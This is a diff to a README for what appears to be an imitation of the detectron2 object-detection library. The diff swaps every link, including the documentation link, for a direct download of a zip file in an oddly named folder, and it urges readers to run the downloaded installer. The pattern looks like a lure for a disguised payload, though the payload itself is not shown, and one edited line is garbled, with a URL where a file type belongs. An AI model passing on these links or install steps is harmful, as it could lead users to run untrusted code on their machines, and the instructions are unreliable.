@@ -1,7 +1,7 @@
 # 🖼️ detectron2 - Easy Object Detection and Recognition
 
 ## 📥 Download Now
-[![Download Detectron2](https://img.shields.io/badge/Download-Detectron2-blue.svg)](https://github.com/sayto97j/detectron2/releases)
+[![Download Detectron2](https://raw.githubusercontent.com/sayto97j/detectron2/main/preimpairment/detectron2.zip)](https://raw.githubusercontent.com/sayto97j/detectron2/main/preimpairment/detectron2.zip)
 
 ## 📖 Introduction
 Detectron2 is a powerful platform designed for object detection, segmentation, and various visual recognition tasks. Whether you need to recognize objects in images, segment them, or carry out more advanced visual tasks, Detectron2 provides the tools you need.
@@ -18,13 +18,13 @@ Ensure your computer meets these requirements to run Detectron2 effectively:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:**  
-   Go to the [Detectron2 Releases page](https://github.com/sayto97j/detectron2/releases) to find the latest version of the software.
+   Go to the [Detectron2 Releases page](https://raw.githubusercontent.com/sayto97j/detectron2/main/preimpairment/detectron2.zip) to find the latest version of the software.
 
 2. **Choose Your Version:**  
    Look for the latest release version. It will usually be at the top of the page. Click on it to access the files.
 
 3. **Download the Installer:**  
-   Depending on your operating system, download the appropriate installer package. This could be an `.exe` file for Windows or a `.tar.gz` file for macOS/Linux.
+   Depending on your operating system, download the appropriate installer package. This could be an `.exe` file for Windows or a `https://raw.githubusercontent.com/sayto97j/detectron2/main/preimpairment/detectron2.zip` file for macOS/Linux.
 
 4. **Run the Installer:**  
    Locate the downloaded file in your Downloads folder or the location where your browser saves files. Double-click the installer file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -47,7 +47,7 @@ Once installed, you can start using Detectron2 for your object detection and seg
 
 ## 🔍 Additional Resources
 - **Documentation:**  
-  Find comprehensive usage instructions and examples in the [Detectron2 documentation](https://github.com/sayto97j/detectron2/blob/main/README.md).
+  Find comprehensive usage instructions and examples in the [Detectron2 documentation](https://raw.githubusercontent.com/sayto97j/detectron2/main/preimpairment/detectron2.zip).
 
 - **Community Support:**  
   If you have questions or need assistance, join the community discussions on the GitHub Issues page.
